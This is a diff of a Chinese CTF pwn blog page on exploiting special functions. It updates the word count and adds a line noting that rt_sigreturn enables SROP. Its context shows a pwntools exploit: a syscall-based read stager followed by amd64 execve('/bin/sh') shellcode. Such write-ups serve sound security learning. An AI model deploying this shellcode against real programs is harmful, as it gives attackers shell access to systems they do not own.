@@ -177,7 +177,7 @@
             </div>
             <h2 class="post-title">pwn之特殊函数利用</h2>
             <div class="post-meta">
-                本文总共2990个字 | 您是第<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>位看到它们的小伙伴
+                本文总共3016个字 | 您是第<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>位看到它们的小伙伴
             </div>
         </div>
         <div class="post-content markdown-body">
@@ -250,6 +250,9 @@
 <li><p>exp</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">code = <span class="string">"""</span></span><br><span class="line"><span class="string">start:</span></span><br><span class="line"><span class="string">	syscall</span></span><br><span class="line"><span class="string">	dec edx</span></span><br><span class="line"><span class="string">	mov esi, ecx</span></span><br><span class="line"><span class="string">	jmp start</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">payload  = asm(code, arch=<span class="string">'amd64'</span>)</span><br><span class="line">p.sendline(str(u64(payload)))			<span class="comment">#read(0, rip, 0xffffffff)</span></span><br><span class="line"></span><br><span class="line">code = <span class="string">"""</span></span><br><span class="line"><span class="string">	mov rsp, rcx</span></span><br><span class="line"><span class="string">	mov rax, 0x3b</span></span><br><span class="line"><span class="string">	xor rsi, rsi</span></span><br><span class="line"><span class="string">	xor rdx, rdx</span></span><br><span class="line"><span class="string">	call shell</span></span><br><span class="line"><span class="string">	.ascii "/bin/sh"</span></span><br><span class="line"><span class="string">	.byte 0</span></span><br><span class="line"><span class="string">shell:</span></span><br><span class="line"><span class="string">	pop rdi</span></span><br><span class="line"><span class="string">	syscall</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">p.sendline(asm(code, arch=<span class="string">'amd64'</span>))</span><br></pre></td></tr></table></figure>
 </li>
+</ul>
+<ul>
+<li>rt_sigreturn，可用于构造SROP。</li>
 </ul>
 <p><a href="https://cloud.tencent.com/developer/article/1079230" target="_blank" rel="noopener">参考链接setbuf</a></p>
 <p><a href="http://eternalsakura13.com/2018/04/27/star_primepwn/" target="_blank" rel="noopener">参考链接syscall</a></p>
